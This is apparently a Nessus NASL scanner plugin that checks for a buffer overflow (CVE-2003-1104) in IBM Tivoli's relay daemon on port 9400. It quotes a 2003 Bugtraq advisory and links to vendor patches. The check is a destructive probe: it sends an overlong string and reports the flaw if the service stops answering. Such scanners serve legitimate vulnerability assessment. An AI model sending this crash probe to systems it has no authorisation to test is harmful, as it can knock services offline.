#
# Ref: 
# Date: Thu, 20 Mar 2003 18:46:59 +0100
# From: Niels Heinen <niels.heinen@ubizen.com>
# Subject: IBM Tivoli Firewall Security Toolbox buffer overflow vulnerability
# To: bugtraq@securityfocus.com 
# Message-id: <3E79FE93.5040407@ubizen.com
#
#
#

if(description)
{
 script_id(11434);
 script_cve_id("CVE-2003-1104");
 script_bugtraq_id(7154, 7157);

 
 script_version ("$Revision: 1.5 $");
 name["english"] = "IBM Tivoli Relay Overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote service (probably the Tivoli Relay daemon) is vulnerable
to a buffer overflow when it receives a too long string.

An attacker may use this flaw to execute arbitrary code on this
host (with the privilege of the user 'nobody')

Solution : See http://www-3.ibm.com/software/sysmgmt/products/support/IBMTivoliManagementFramework.html
               ftp://ftp.software.ibm.com/software/tivoli_support/patches/patches_1.3
	       
Risk factor : High";
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the overflow in Tivoli relay daemon";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Firewalls";
 family["francais"] = "Firewalls";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(9400);
 exit(0);
}


if(get_port_state(9400))
{ 
 soc = open_sock_tcp(9400);
 if(!soc)exit(0);
 
 send(socket:soc, data:string(crap(238), "\r\n"));
 r = recv(socket:soc, length:1024);
 close(soc);
 
 soc2 = open_sock_tcp(9400);
 if(!soc2)security_hole(9400);
}
